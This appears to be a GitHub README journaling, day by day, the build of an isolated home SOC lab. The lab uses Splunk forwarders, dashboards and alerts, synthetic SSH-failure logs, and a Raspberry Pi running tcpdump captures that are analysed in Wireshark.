# Home-lab (step by step)

## 🏗️ Lab Overview
📘 This lab is for educational and ethical testing only, performed on my own isolated network.

My SOC lab consists of multiple systems connected in an isolated network:

- Proxmox Server: Core hypervisor running virtual machines  
- Kali Linux: Attack simulation system  
- Ubuntu Server (Splunk): Log collection & SIEM analysis  
- Raspberry Pi 4: Network packet capture node (tcpdump automation)  
- Linux Mint Host: Analysis and documentation workstation  
- Wireshark: For traffic inspection and forensic packet analysis

## 🧰 Tools Used

- Splunk (SIEM)
- Wazuh
- Wireshark (Packet Analysis)
- Tcpdump (Capture automation)
- Kali Linux (Attack simulation)
- Proxmox VE, VirtualBox (Virtualization)
- Raspberry Pi 4 (Network sensor)
- Nmap / Hydra / Netdiscover (Testing & scanning)
- Scp / SSH (File transfer & remote access)

## 🖥️ Hardware Setup (OLD)
 
 • Host Laptop: Intel i7 10th Gen, 4 cores, 16 GB DDR4, 1 TB SSD

 • Secondary PC: Intel i5 6th Gen, 4 cores, 16 GB DDR4, 120 GB SSD
 
 • Server: Intel i5 4th Gen, 4 cores, 16 GB DDR3, 250 GB SSD + 2 TB HDD

 • Router: Used to create an isolated lab network (no internet)
 
 • Additional Laptop: Dual-core CPU, 4 GB RAM — for quick checks or file sharing

## 🧠 Hardware Setup (NEW)
 
 • Host Laptop: Thinkpad 14T ryzen 5, 6 cores, 24 GB DDR4, 1 TB SSD
 
 • Server: Supermicro Xeon 8 cores, 128 GB RAM, 500 GB SSD + 2×2 TB HDD (running Proxmox)
 
 • Linux Mint (victim): Old Laptop asus i5, 120 GB SSD
 
 • Raspberry Pi 4 8 GB Ram + sd card 64 GB

 • Switch: TP-Link 5-Port Gigabit
 
 • Additional Laptop: Dual-core CPU, 4 GB RAM — used for internet checks and file sharing

 • Router: Old router configured to isolate internal lab network


## 🚀 Day 0 — Cybersecurity.Start
 
 • Installed a clean Windows 10, then upgraded to Windows 11 to avoid compatibility issues.
 
 • Installed VirtualBox and added Ubuntu as the first virtual machine, followed by full updates.
 
 • Created additional Windows 10 VMs and resolved minor setup issues (e.g., disabling the floppy controller and deleting unnecessary system files).
 
 • Installed and updated Kali Linux without issues.

Later, I spent several days troubleshooting Ubuntu 24.04 while trying to install Wazuh and Splunk.
After multiple attempts, I successfully reinstalled Splunk on the new Ubuntu version, configured it, and verified it works properly.

 • Configured Windows (PowerShell + CMD) and Ubuntu (Terminal) for event forwarding into Splunk.

 • Created a shared folder between Windows and Ubuntu to exchange scripts, screenshots, and logs efficiently.


## 🧩 Day 1 — Checking Connectivity and Functionality

 • Verified all network connections and system communication.
 
 • Tested Windows → Ubuntu log forwarding using PowerShell event generation.

 • Identified an initial issue caused by antivirus interference, which blocked event forwarding.
 
 • ✅ Solved by adjusting antivirus rules and reconfiguring permissions.
 
 • Successfully sent 1, 10, and 100 events with different log levels: Error, Info, Warning.
 
 • Created a command reference text file containing essential maintenance and diagnostic commands for both Windows and Ubuntu, useful when working in Splunk.


<img width="1920" height="923" alt="Screenshot from 2025-09-27 12-38-36" src="https://github.com/user-attachments/assets/b0900b6f-81d7-430c-a73d-2fecbaaead8f" />
<img width="1025" height="910" alt="Screenshot from 2025-09-27 12-55-11" src="https://github.com/user-attachments/assets/d871db26-7ee2-4201-b39e-78f2623539d0" />
<img width="1920" height="923" alt="Screenshot from 2025-09-27 12-45-01" src="https://github.com/user-attachments/assets/59a0584b-834c-410b-a45b-f300433a3686" />



## Day 2 - Splunk Home Lab - Event Monitoring & Alerts
Was testing around 4 hours how everything works. Learning how to work with Splunk web.

1️. Machine Connectivity
- Connected multiple machines in a closed network.
- Verified that events are sent and received correctly between machines.
- Ensured proper data flow to Splunk indexes for monitoring.

2️. Log Generation & Analysis
- Generated 3,000–4,000 simulated log events with levels INFO, WARN, ERROR.
- Logs uploaded to Splunk and each event verified.
- Extracted important fields using rex.

3. Created alerts and learned how to save cvs files


<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 123405" src="https://github.com/user-attachments/assets/2bea63a8-8a1e-4e7b-9128-5dea1bcccbf7" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 140459" src="https://github.com/user-attachments/assets/619071f7-cb32-4b24-b008-f78497a1b11f" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 140250" src="https://github.com/user-attachments/assets/4f30c3e5-ad4f-4e93-958d-9aa3306b7f98" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 125852" src="https://github.com/user-attachments/assets/db316be7-4213-4710-b737-5f6c21ea306b" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 124025" src="https://github.com/user-attachments/assets/8f363536-d402-49b3-923c-fd8cc9da1315" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 155801" src="https://github.com/user-attachments/assets/5450a37f-b098-4de9-8e21-7d7bdae49cec" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 155316" src="https://github.com/user-attachments/assets/44ea47af-0b7c-464d-9b15-f9dc780a8c47" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-09-29 154930" src="https://github.com/user-attachments/assets/6a502b2d-5397-4efe-b916-7624e8194afc" />


## Day 3 - Splunk Installation Failure on Windows

I thought that everything works fine but when i started practice on sending events the splunk connection got broken and events stop coming on me host pc. So i decided to take anothere pc and install everything on more time but on clean windows 10.

Goal: Install Splunk Universal Forwarder on Windows and connect it to my Splunk Enterprise instance.
Result: ❌ Unsuccessful — encountered repeated MSI installer errors and permission issues.

Steps Taken
 1. Downloaded the official Splunk Universal Forwarder .msi from Splunk’s website.
 2. Tried to install normally → No “Run as administrator” button available.
 3. Attempted installation via Command Prompt and PowerShell with:

→ Result: “No se puede abrir este paquete de instalación…” error.

 4. Verified the MSI file was not corrupted.
 5. Checked permissions — account had administrator rights.
 6. Tried extracting MSI to TEMP and running from there → same error.
 7. Attempted to enable logging and check Windows Installer service — error 2203 and 1402, Rollback\Scripts key missing.
 8. Even on a brand new Windows PC the same MSI error appeared.
 9. Disabled antivirus and firewalls — still failed.
 10. After 8+ hours of troubleshooting (MSI repair, permissions, logs) → no progress.

Errors Encountered
 • Windows Installer Error 2203 & 1402 (permissions & missing registry keys).
 • “No se puede abrir este paquete de instalación…” despite valid MSI.
 • No Rollback\Scripts registry keys present.
 • Installation fails before any UI appears.

Resolution

💡 Switched to Linux. Installed Splunk Forwarder on Ubuntu in minutes using .tgz, configured forwarding to Splunk Enterprise, and started generating and analyzing events successfully.

Lessons Learned
 • Windows MSI installers can fail even on fresh systems, and debugging is often time-consuming.
 • Linux installation is much more transparent (untar + run commands).
 • Always have a backup platform (Ubuntu) to continue practicing if one system blocks progress.
 • Network and permissions issues are easier to debug on Linux with standard tools (tar, ss, nc, ping, etc.).


 ![photo_2025-10-05_23-45-55](https://github.com/user-attachments/assets/bd539b81-e15c-4c36-b9b9-4adfe043eb92)
![photo_2025-10-05_23-46-03](https://github.com/user-attachments/assets/2aab05a9-65f2-42b9-ac05-3c1e7dd564c6)
![photo_2025-10-05_23-46-14](https://github.com/user-attachments/assets/731778df-ede0-479b-b2b2-72ea159929c6)



## Day 4 - Practice fully on Ubuntu

Today I set up my home lab but based on Linux to practice log ingestion, forwarding, and alerting in a fully offline environment. The lab consisted of:

 • Host machine: Ubuntu 24.04 VM running Splunk Enterprise
 
 • Secondary machine: Physical Ubuntu PC acting as a Splunk Universal Forwarder also 24.04

Key Steps Completed

 1. Clean Setup & Installation
 
 • Installed Splunk Universal Forwarder on Ubuntu2.
 
 • Configured forwarding to the host Splunk Enterprise instance.

 • Verified service status and active forwarders with splunk list forward-server.

 2. Log Ingestion Practice
 
 • Created custom log file /var/log/custom_test.log with multiple event types (INFO, WARN, ERROR) using bash loops.
 
 • Configured inputs.conf to monitor the custom log file and assigned index=main and sourcetype=custom_test.
 
 • Confirmed logs appeared in Splunk Web using searches like:

3. Forwarding & Connectivity Tests

 • Verified network connectivity between Ubuntu2 (forwarder) and host VM via ping and nc -vz <host_ip> 9997.
 
 • Observed forwarded events arriving correctly in the host Splunk instance.

4. Alerts & Testing
 
 • Practiced creating alerts on custom log events (INFO/WARN/ERROR).
 
 5. Lessons Learned
 
 • Linux permissions are crucial; most errors were caused by incorrect ownership or missing directories.

 • Forwarder configuration and network setup must match IPs and open ports.

 • Offline labs are fully functional for ingesting, searching, and alerting without needing internet.

<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-53-51" src="https://github.com/user-attachments/assets/88f5ff00-c5a7-46da-ac2d-f79eea4ee57a" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-48-49" src="https://github.com/user-attachments/assets/4ad67967-89a1-4424-81a9-f99e0144c355" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-36-13" src="https://github.com/user-attachments/assets/b90f234a-8c03-48b8-8550-079310b60a06" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-31-13" src="https://github.com/user-attachments/assets/6462bec6-74a2-4b9c-941f-0b58e80c6ee2" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-09-39" src="https://github.com/user-attachments/assets/ba9b2614-651e-4b11-80d9-08b205b7b5b9" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 12-58-25" src="https://github.com/user-attachments/assets/c84740a9-50b3-4426-95c1-e61e38782163" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 12-47-40" src="https://github.com/user-attachments/assets/5d9a3e69-fed6-44bf-9c86-d96795aa2d35" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 12-44-59" src="https://github.com/user-attachments/assets/dfacacc0-3d2d-42b4-9bf0-fb7730ce9bae" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 12-35-49" src="https://github.com/user-attachments/assets/64536968-89a0-4a38-9b56-1d10000efd0c" />
<img width="1805" height="698" alt="Screenshot from 2025-10-02 14-58-41" src="https://github.com/user-attachments/assets/3cfa4a2f-82d5-4470-98a3-327e7fb9e130" />

## Day 5 - Splunk Log Forwarding and Dashboard Practice

### 🏗️ Goal
Continue developing hands-on Splunk skills by configuring log forwarding between my physical Ubuntu machine (forwarder) and Ubuntu VM (indexer), validating event flow, and creating dashboards for analysis.

### ⚙️ Setup
Systems Involved:
- Ubuntu physical machine — Splunk Universal Forwarder  
- Ubuntu VM (on Windows host) — Splunk Enterprise Indexer  
- Windows Host — used to monitor and manage configuration  

Configuration Steps:
- Verified network connectivity and open communication ports  
- Configured Splunk Forwarder → Indexer connection  
- Adjusted firewall settings to allow Splunk traffic  

### 🧩 Work Summary
- Generated multiple custom log events with severity levels:  
  - INFO – normal operations  
  - WARN – system warnings  
  - ERROR – simulated failures  
- Confirmed successful event ingestion and indexing in Splunk  
- Created alerts for specific event types to simulate real SOC monitoring  
- Designed dashboards for data visualization and pattern recognition  

### 🔍 Analysis
- Observed SSH connection logs and built alerts for failed login attempts  
- Visualized the frequency and timing of SSH errors in real time  
- Practiced event classification, alert tuning, and data correlation  

This session reinforced core SOC concepts:
> Log collection → Event categorization → Alerting → Visualization → Incident awareness.

<img width="1920" height="922" alt="Screenshot from 2025-10-02 12-47-40" src="https://github.com/user-attachments/assets/80aeeb0e-1698-4868-8832-a41dd7278376" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-31-13" src="https://github.com/user-attachments/assets/3c020aa0-3814-4412-90e6-fa0d9e9a595c" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-48-49" src="https://github.com/user-attachments/assets/70b8344c-1441-4cfd-b6c3-ba7212cd141f" />
<img width="1920" height="922" alt="Screenshot from 2025-10-02 13-53-51" src="https://github.com/user-attachments/assets/9b1011f7-8ab0-499e-b0e6-a5eddaf06198" />
<img width="1920" height="923" alt="Screenshot from 2025-10-06 15-01-07" src="https://github.com/user-attachments/assets/c73cfbde-483a-4e14-8d25-3fa846f88f35" />
<img width="1920" height="923" alt="Screenshot from 2025-10-06 15-30-52" src="https://github.com/user-attachments/assets/d92c9421-b811-4957-91ab-a0fb66e30862" />
<img width="1920" height="923" alt="Screenshot from 2025-10-06 15-36-10" src="https://github.com/user-attachments/assets/47be3a54-0c19-4410-bf81-62af176eb315" />

### 🧭 Next Steps
- Integrate Windows event logs into the same Splunk instance  
- Correlate SSH failures with Windows authentication logs  
- Expand dashboard automation for daily monitoring practice


## Day 6 - Events,Dashboards

What was done
 
 • Reviewed and analyzed previously generated test events (Error, Info, Warning, SSH).
 
 • Verified that events were correctly indexed and visible through the Search & Reporting app.
 
 • Created and customized a Classic Dashboard in Splunk:
 
 • Added multiple visualizations including pie charts, bar charts, and single value panels.
 
 • Grouped events by sourcetype and severity level.
 
 • Displayed SSH activity over time and error counts in real-time.
 
 • Practiced alerting concepts and reviewed email alert limitations in closed lab networks.
 
 • Fixed permission issues related to event generation and log file monitoring.
 
 • Sent and monitored over 100 SSH-related events to test dashboard responsiveness.

 Key Learnings
 
 • How to build and structure dashboards in Splunk using classic panels.
 
 • Importance of permissions when creating and writing to log files.
 
 • Understanding how different sourcetypes and event severities can be visualized together.

<img width="1920" height="923" alt="Screenshot from 2025-10-07 18-10-57" src="https://github.com/user-attachments/assets/2d8e66b2-7334-4423-8617-9ed680233edb" />

<img width="1920" height="923" alt="Screenshot from 2025-10-07 18-16-59" src="https://github.com/user-attachments/assets/0b2ce272-2e2b-42cd-9c01-af2127c9813d" />


Dashboard
<img width="1080" height="1795" alt="Screenshot from 2025-10-07 18-30-32" src="https://github.com/user-attachments/assets/ed3292bc-8d47-4f18-b265-4ba05de46044" />

<img width="1080" height="1795" alt="Screenshot from 2025-10-07 18-31-58" src="https://github.com/user-attachments/assets/cf1649f8-862a-4168-a2e9-9a979c728196" />

<img width="1080" height="1795" alt="Screenshot from 2025-10-07 18-45-09" src="https://github.com/user-attachments/assets/27b4f6ab-b4dc-4823-a60f-f359de8447ed" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-07 18-57-36" src="https://github.com/user-attachments/assets/bc91f61b-a593-499e-a159-8a25a92585b3" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-07 18-58-28" src="https://github.com/user-attachments/assets/8cb85e0d-e178-4198-a06d-218b1f7e09a4" />

## Day 7 - Splunk Log Monitoring & SOC Lab

Today I focused on building a hands-on log monitoring workflow using Splunk Enterprise and Splunk Forwarder. The main tasks completed were:
 1. Environment Setup: Verified connectivity between Ubuntu VMs, ensuring the forwarder sends logs to Splunk Enterprise successfully.
 2. Log Generation & Testing: Created synthetic logs including INFO, WARN, ERROR, and SSH failed login events. After starting the log generator, events were received in real time by Splunk.
 3. Live Event Dashboard: Built a SOC-style dashboard displaying event counts by type, top SSH attacker IPs, and recent events, with color-coded severity for easy visualization.
 4. Alerts Configuration: Set up real-time alerts for SSH failures, ERRORs, and WARNs, enabling immediate notification of anomalies.

Key Learnings:
 
• Handling unmatched events (NULL) and labeling them for better visualization.

• Creating real-time dashboards and alerts to simulate SOC monitoring.

• Practical experience with log generation, ingestion, and visualization in a controlled lab environment.

<img width="1080" height="1795" alt="Screenshot from 2025-10-13 09-39-06" src="https://github.com/user-attachments/assets/3050506c-cac4-4a75-83d4-348b78cec7d0" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-13 12-19-25" src="https://github.com/user-attachments/assets/653e3143-323d-4cc3-88ff-95fed222c042" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-13 12-21-25" src="https://github.com/user-attachments/assets/6e10c0a2-7df9-4ff6-b16e-30a847a6d619" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-13 13-05-45" src="https://github.com/user-attachments/assets/753a158b-f8fb-46f0-82f4-10b16664a89b" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-13 13-22-57" src="https://github.com/user-attachments/assets/e86f1437-e1b9-4cef-987d-9f6fe4090b5c" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-13 13-36-42" src="https://github.com/user-attachments/assets/22a61653-0e56-42e3-9eca-5e96ec8c1327" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-13 11-35-20" src="https://github.com/user-attachments/assets/33d85491-c816-4356-a815-9e686c4cb9fa" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-13 11-52-11" src="https://github.com/user-attachments/assets/c120cb57-8c85-4cbb-af1e-b6a3bdb6c8ac" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-13 12-03-49" src="https://github.com/user-attachments/assets/be6a6619-40fe-4f56-8edd-6a0405d36d97" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-13 14-16-13" src="https://github.com/user-attachments/assets/2b1569ae-f981-45cc-af60-7fbf58eb58c6" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-13 15-43-12" src="https://github.com/user-attachments/assets/2978d4d5-ee7e-44b0-abef-d37beae3a55f" />

 

Next Steps: Extend the lab with correlation searches and more complex SOC scenarios for enhanced security monitoring practice.

## Day 8 - Splunk Lab: Real-Time Log Monitoring, Field Extraction, Dashboards & Alerts

Environment Setup
 
 • Host PC: Ubuntu with Splunk Enterprise
 
 • VM / Remote PC: Ubuntu with Splunk Universal Forwarder
 
 • Verified SSH connectivity between host and forwarder.
 
 • Splunk Forwarder installed and configured to send logs to Splunk Enterprise.

⸻

Log Preparation

 • Created a custom log file: /var/log/custom_test.log
 
 • Generated different log types:
 
 • INFO → normal events (e.g., User logged in, Page served)
 
 • WARN → warnings (e.g., Slow DB query, High memory usage)
 
 • ERROR → errors (e.g., Permission denied, Service crashed)
 
 • Simulated failed SSH login attempts with dynamic usernames, IPs, and ports.

 • Confirmed logs were ingested in real-time by Splunk after enabling the log generator.

⸻

Field Extraction

 • Used Field Extractor (rex) to extract:
 
 • username
 
 • src_ip
 
 • port
 
 • Verified fields appeared correctly in search results and in dashboard panels.
 
 • This allowed aggregation, visualization, and alerting.

⸻

Dashboard Creation
 
 • Created a new dashboard combining all extracted fields.
 
 • Panels included:
 
 • Top attacking IP addresses
 
 • Top targeted usernames
 
 • Recent failed login events
 
 • Set dashboard to refresh every 1 minute for real-time monitoring.
 
 • Tested PDF export functionality to practice report sharing.

⸻

Alerts
 
 • Created alerts for suspicious IPs based on thresholds (e.g., multiple failed logins).
 
 • Alerts were linked to extracted fields (src_ip) and could trigger notifications.

⸻

Observations
 
 • Real-time logs worked as expected 👍
 
 • NULL values appeared in some columns — caused by failed SSH login events, normal in this lab setup
 
 • Geolocation columns (Country/City) were empty because IPs were private lab addresses — expected behavior in a home lab
 
 • Dashboard visualization allowed quick identification of suspicious activity across multiple fields


<img width="1080" height="1795" alt="Screenshot from 2025-10-14 09-58-41" src="https://github.com/user-attachments/assets/ad9a2db7-ab87-423a-bf21-ce1455d7a42c" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 10-02-26" src="https://github.com/user-attachments/assets/9e3f466a-1079-4077-8fac-f7c25faebb7e" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 10-06-19" src="https://github.com/user-attachments/assets/e219c75e-6c11-44f2-9a2f-702b9adb351b" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 10-15-32" src="https://github.com/user-attachments/assets/d53995c3-c334-4c90-a265-b22e11838127" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 11-23-36" src="https://github.com/user-attachments/assets/823c745e-3c14-4820-8e0e-033fe275ac8f" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 11-24-00" src="https://github.com/user-attachments/assets/f21f8b95-53a4-4bcd-936b-c6d220661c11" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 11-43-46" src="https://github.com/user-attachments/assets/b33f2606-f4af-4b11-9687-651e57d40bbf" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 11-50-33" src="https://github.com/user-attachments/assets/b011348a-1eb7-4735-add1-9f9b18b8bc78" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 11-52-12" src="https://github.com/user-attachments/assets/f7599ca8-26de-4958-a3de-8e6b654e3282" />
<img width="1080" height="1795" alt="Screenshot from 2025-10-14 12-02-31" src="https://github.com/user-attachments/assets/fefca96e-9f11-467a-88c7-249483c7de47" />


Next Steps / To-Do
 
 • Extend dashboards for error/warn/info logs
 
 • Test alerts by generating more SSH failed login events
 
 • Explore additional SPL commands: timechart, top, where
 
 • Simulate public IPs to enable geolocation mapping in dashboards


## Day 9 – Home Lab expanded
Date: 2025-10-16

## Summary:
Today I expanded my home lab by integrating my new server (PC3) with the existing environment. The goal was to practice multi-device log forwarding, SSH management, and real-time monitoring in Splunk.

## Work Completed:

## 1. Hardware Integration:
 • Added PC3 (i5 4th Gen) to the lab.
 
 • Installed 2×1TB HDDs in PC3.
 
 • Connected PC3, PC2, and the host laptop to the new TL-SG105E switch.
 
 • Configured switch with basic settings:
 
 • Access to web interface.

 • Default QoS and VLAN settings for lab network.
 
## 2. Operating System & Network:

 • Installed Ubuntu Server 22.04 on PC3.
 
 • Configured static IP for PC3: 192.168.1.10/24 via netplan.
 
 • Gateway: 192.168.1.1 (router)
 
 • DNS: 192.168.1.1

 • Connected host laptop via WiFi, PC2 via Ethernet.
 
 • Ensured PC3 is reachable via SSH from PC2.

 • Note: If the router is turned off or devices reconnect, dynamically assigned IPs (DHCP) may change unless static IPs are set on all machines or reserved in the router.
 
## 3. Splunk Forwarder Setup:

 • Installed Splunk Universal Forwarder on PC3.

 • Configured forwarder to send logs to the Splunk host (host laptop).
 
 • Verified connectivity and forwarding using nc and splunk list forward-server.
 
## 4. Testing & Monitoring:
 
 • Confirmed active forwarders on the Splunk host.
 
 • Tested sending logs from PC3 through SSH-managed terminals.
 
 • Verified that the host receives logs correctly.

## Challenges:
 
 • Initial confusion with IP addressing and Splunk session login.
 
 • Minor troubleshooting required for firewall and forwarder configuration.

## Key Takeaways:

 • Multi-device lab setup allows practicing realistic SOC workflows.

 • SSH access to servers enables headless management.
 
 • Splunk forwarders can be configured on multiple machines, sending logs to a central host for monitoring.

 • Static IPs are important for consistency in lab environments to prevent connection issues.

## Next Steps:
 
 • Practice sending custom logs from PC3 and verifying them in Splunk.
 
 • Automate log generation and forwarding for real-time dashboard updates.

 • Continue expanding lab with more scenarios and alerts.


<img width="1920" height="922" alt="Screenshot from 2025-10-16 17-50-32" src="https://github.com/user-attachments/assets/65dd59e5-9051-4928-bb5c-5ea5a77b8270" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-16 20-11-23" src="https://github.com/user-attachments/assets/c4781938-dbfd-4311-bd5c-3fdadf3e960d" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-16 20-42-32" src="https://github.com/user-attachments/assets/a84843b5-34ef-474c-ac96-dd7f16f6891b" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-16 21-01-02" src="https://github.com/user-attachments/assets/d61c1389-03e9-4300-add5-5e0424432609" />


## Day 10 – Home Lab Practice (Splunk + Server Management)

## What I did today:

 ## 1. Server Management via SSH

 • Managed PC3 (server) from PC2 using SSH.
 
 • Opened two terminals simultaneously:

 • One for monitoring logs.

 • One for server management and configuration.

 • This setup made managing the server more convenient without needing to use the host laptop directly.

 ## 2. Log Forwarding & Monitoring
 
 • Confirmed that PC2 and PC3 are sending logs to the Host Laptop (running Splunk Enterprise).

 • Tested sending custom logs from PC3 using:

echo "Hello Splunk! $(date)" | sudo tee -a /tmp/test_splunk.log

• Verified logs appear in real-time on Splunk.

 ## 3. Live Log Generator
 
 • Started automatic log generation on PC2 and PC3 (server) to simulate real-time events.

 • Observed logs from both PCs flowing into Splunk dashboards.

 ## 4. Switch Configuration

 • Renamed the switch to a friendly name.

 • Verified port mapping:
 
 • Port 1 → Router

 • Port 2 → PC2
 
 • Port 3 → PC3 (Server)

 • Port 4 → Host Laptop

## Notes & Insights:
 • Host Laptop is mainly receiving logs; PC2 acts as the control terminal for server management.
 • Multiple SSH sessions make it easy to monitor and manage the server at the same time.
 • Lab environment is now fully functional with 3 computers + switch + router, ready for further practice and log experimentation.

<img width="1920" height="1080" alt="Screenshot from 2025-10-17 15-47-43" src="https://github.com/user-attachments/assets/2bc034f0-3f8e-467d-b932-4ea68f936523" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-17 16-05-05" src="https://github.com/user-attachments/assets/9068ff41-f283-48ab-a347-ecdc0e89e363" />
<img width="1920" height="922" alt="Screenshot from 2025-10-16 19-47-17" src="https://github.com/user-attachments/assets/2a8f0187-55bf-42a6-b2bf-a103553eb5c8" />
<img width="1920" height="922" alt="Screenshot from 2025-10-17 13-45-13" src="https://github.com/user-attachments/assets/5fae6cc5-da06-4ef1-a2cf-c5a7306f014e" />
<img width="1920" height="922" alt="Screenshot from 2025-10-17 13-47-44" src="https://github.com/user-attachments/assets/ed92a973-1aa2-4d18-be57-b3a5acdc5049" />
<img width="1920" height="922" alt="Screenshot from 2025-10-17 14-00-15" src="https://github.com/user-attachments/assets/21155882-5fd6-4f3c-8e24-bce6753a165c" />
<img width="1077" height="1914" alt="Captura de pantalla 2025-10-17 163636" src="https://github.com/user-attachments/assets/66db92af-07fc-440a-ae29-2de42fb9a5bd" />

## Next steps:
 1. Configure PC3 to forward specific logs needed for testing.
 2. Use more an automatic log generator on PC3 like on PC2.
 3. Practice more advanced Splunk dashboards and alerts with both forwarders.
 4. Explore additional switch features like VLANs or QoS if needed.


## Day 11 — Raspberry Pi Integration as Network Sensor

## Overview

Today I successfully integrated a Raspberry Pi 4 (8 GB) into my home cybersecurity lab.
The Pi now works as a network sensor, continuously capturing LAN traffic via the switch’s mirrored port.
Captured data is later analyzed on my host PC with Wireshark.

## Configuration Summary
 
 • Hardware: Raspberry Pi 4 (8 GB RAM / 64 GB SD Card / Ethernet)

 • Network: Connected through managed switch (TP-Link TL-SG105E) to mirror PC2 + PC3 ports
 
 • Installed and tested tcpdump for manual packet capture
 
 • Built auto-capture script that saves .pcap files every 15 minutes
 
 • Verified cron job activity using journalctl
 
 • Enabled SSH for remote file management and transfer
 
 • Transferred .pcap files to host and opened them in Wireshark

## Key Commands Used

ip a

sudo tcpdump -i eth0 -c 200 -w /home/admin/captures/test_$(date +%F_%H%M%S).pcap
ls -lh /home/admin/captures

sudo /usr/local/bin/autocapture.sh

sudo crontab -e

sudo journalctl -u cron -b

scp admin@192.-.-.-:/home/admin/captures/*.pcap ~/Desktop/

sudo systemctl enable ssh

## Results
 • Automatic packet captures confirmed working
 
 • Files transferred successfully and opened in Wireshark
 
 • Raspberry Pi operating fully headless via SSH
 
 • Network traffic from Splunk forwarders visible in live captures

<img width="1920" height="1080" alt="20251021_12h06m29s_grim" src="https://github.com/user-attachments/assets/f1d06230-8d5c-4adb-a2e6-5afdde1eb429" />
<img width="1920" height="1080" alt="20251021_14h34m53s_grim" src="https://github.com/user-attachments/assets/701487d9-fe80-43bc-b20f-d9e74f54b9ee" />
<img width="1920" height="1080" alt="20251021_16h34m45s_grim" src="https://github.com/user-attachments/assets/ef70ab32-c72a-48f3-8758-81c917fa78a5" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-10-21 201815" src="https://github.com/user-attachments/assets/d17bb0fa-5161-4893-84ed-c4c4d6533606" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-10-21 215811" src="https://github.com/user-attachments/assets/40f74bda-f7f0-42af-8e93-b6fb35989558" />
<img width="1920" height="922" alt="Screenshot from 2025-10-21 19-38-23" src="https://github.com/user-attachments/assets/778b1520-3cce-45d6-a69d-40cd2c5e7800" />
<img width="1920" height="922" alt="Screenshot from 2025-10-21 19-45-17" src="https://github.com/user-attachments/assets/a54c45c5-0bf3-47f8-bb9f-31b665d888ff" />


## Next Steps
 
 • Automate file transfer to host for daily review
 
 • Start filtering captures by protocol (DNS, HTTP, TCP, ICMP)
 
 • Identify attack signatures and anomalies in generated traffic

 • Integrate Wireshark filters + Splunk dashboards to correlate data


## Day 12 – Splunk Querying, Raspberry Pi Integration & Network Analysis

Date: October 22, 2025

Focus: Log correlation, Splunk dashboarding, alerts, and network packet analysis

## Main Accomplishments
 
 1. Checked connectivity and Splunk Forwarders:
 
 • Verified that all machines (PC2, PC3, Raspberry Pi, and host) are connected and forwarding logs to the Splunk indexer successfully.

 • Ensured communication between nodes via Ethernet and network ping tests.
 
 2. Raspberry Pi Integration:
 
 • Verified sensor functionality and log capture from Raspberry Pi.

 • Executed and validated network capture scripts.
 
 • Successfully transferred .pcap files to host via scp for offline analysis.
 
 3. SSH Remote Management:
 
 • Connected from PC2 to PC3 (server) via SSH.
 
 • Managed log generation scripts remotely to test real-time Splunk log forwarding.

 4. Splunk Analysis & Visualization:
 
 • Used multiple search queries to filter and analyze authentication and network logs.
 
 • Built a custom Splunk dashboard visualizing failed/successful login attempts.
 
 • Implemented visual panels for top IPs, top users, and login trends over time.
 
 5. Splunk Alert Configuration:
 
 • Created an alert trigger for failed login attempts (threshold: >2 attempts).
 
 • Configured alert action for monitoring brute-force activity simulation.
 
 6. Packet Capture Analysis in Wireshark:
 
 • Pulled last network captures from Raspberry Pi to host using SCP.
 
 • Imported captures into Wireshark.
 
 • Applied filters:
 
 • tcp
 
 • icmp
 
 • tcp.port == 9997 (Splunk traffic filter)
 
 • Observed traffic flow between forwarders and Splunk host.


## Tools Used
 
 • Splunk Enterprise (Indexer & Web Interface)
 
 • Splunk Universal Forwarder
 
 • Wireshark
 
 • Raspberry Pi 4 (as passive network sensor)

 • SSH (remote management)
 
 • SCP (secure copy)


## Key Learnings
 
 • Improved efficiency in Splunk query building and dashboard customization.
 
 • Understood data flow from system logs → Splunk index → visual dashboard.
 
 • Learned how to identify and analyze TCP flows and Splunk communication in Wireshark.
 
 • Practiced remote log management and network packet capture automation.


<img width="1920" height="922" alt="Screenshot from 2025-10-22 09-33-40" src="https://github.com/user-attachments/assets/df3e88bb-d5cb-4e67-b0ab-f55ac284e2d5" />
